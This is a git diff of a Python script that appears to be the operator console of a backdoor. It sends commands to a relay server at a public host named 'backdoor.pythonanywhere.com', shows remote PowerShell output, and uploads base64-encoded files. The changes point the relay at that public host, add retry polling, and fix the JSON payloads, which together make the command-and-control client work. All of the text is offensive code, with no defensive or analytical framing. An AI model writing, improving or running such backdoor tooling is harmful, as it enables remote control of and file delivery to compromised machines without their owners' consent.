@@ -5,7 +5,8 @@ import base64
 import os
 
 
-SERVER_IP = 'http://127.0.0.1:5000'
+# SERVER_IP = 'http://127.0.0.1:5000'
+SERVER_IP = 'https://backdoor.pythonanywhere.com'
 
 cd: str = ''
 lastest = None
@@ -16,11 +17,17 @@ send_t: threading.Thread = None
 
 def recv():
     global cd, lastest, proceed
-    resp = requests.post(SERVER_IP + '/client/recv', timeout=10).text
+    resp = requests.post(SERVER_IP + '/client/recv', timeout=10)
+    while resp.status_code == 204:
+        resp = requests.post(SERVER_IP + '/client/recv', timeout=10)
+    resp = resp.text
     cd = 'PS ' + json.loads(resp)['output'] + '>'
     while not terminate:
         try:
-            resp = requests.post(SERVER_IP + '/client/recv', timeout=10).text
+            resp = requests.post(SERVER_IP + '/client/recv', timeout=10)
+            while resp.status_code == 204:
+                resp = requests.post(SERVER_IP + '/client/recv', timeout=10)
+            resp = resp.text
             cd = 'PS ' + json.loads(resp)['cwd'] + '>'
             lastest = json.loads(resp)['output'] if json.loads(resp)['output'] is not None else '\033[31m' + str(json.loads(resp)['error']) + '\033[0m'
         except requests.exceptions.ReadTimeout:
@@ -47,11 +54,11 @@ def send():
             try:
                 with open(path, 'rb') as f:
                     file_data = base64.b64encode(f.read()).decode()
-                requests.post(SERVER_IP + '/client/send', json=json.dumps({
+                requests.post(SERVER_IP + '/client/send', json={
                     'command': 'upload',
                     'filename': filename,
                     'filedata': file_data
-                }))
+                })
             except Exception as e:
                 print(f"\033[31mUpload failed: {e}\033[0m")
                 proceed = True
@@ -60,14 +67,14 @@ def send():
             proceed = False
             continue
         
-        requests.post(SERVER_IP + '/client/send', json=json.dumps({'command': cmd}))
+        requests.post(SERVER_IP + '/client/send', json={'command': cmd})
         proceed = False
     terminate = True
 
 
 def main():
     global send_t, terminate
-    requests.post(SERVER_IP + '/client/send', json=json.dumps({'command': 'cd'})).text
+    requests.post(SERVER_IP + '/client/send', json={'command': 'cd'})
     recv_t = threading.Thread(target=recv)
     recv_t.start()
     while not terminate:
